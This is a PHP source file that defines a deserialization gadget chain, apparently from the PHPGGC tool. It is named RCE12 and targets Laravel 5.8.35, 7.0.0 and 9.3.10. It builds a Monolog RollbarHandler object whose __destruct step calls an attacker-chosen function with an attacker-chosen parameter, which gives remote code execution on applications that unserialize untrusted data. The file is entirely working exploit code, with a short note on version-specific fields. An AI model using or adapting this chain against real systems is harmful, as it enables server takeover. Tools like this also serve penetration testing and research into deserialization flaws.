<?php

namespace GadgetChain\Laravel;

class RCE12 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.8.35, 7.0.0, 9.3.10';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'According to different version you may need to modify the "gadgets.php". For Laravel5, use the field $rollbarNotifier. For laravel7 and later, use the filed $rollbarLogger';


    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];

        $a = new \Monolog\Handler\RollbarHandler($function, $param);

        return $a;
    }
}
